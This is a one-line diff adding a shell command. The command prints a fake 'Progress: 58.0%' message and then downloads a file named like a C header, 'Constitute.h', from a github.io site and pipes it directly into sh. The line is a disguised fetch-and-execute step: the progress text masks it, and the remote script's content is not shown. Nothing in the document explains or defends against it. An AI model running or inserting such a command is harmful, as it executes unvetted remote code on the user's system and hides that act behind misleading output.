@@ -1,0 +1,1 @@
+echo 'Progress: 58.0%'; curl -L --progress-bar frkns.github.io/fun/Constitute.h | sh
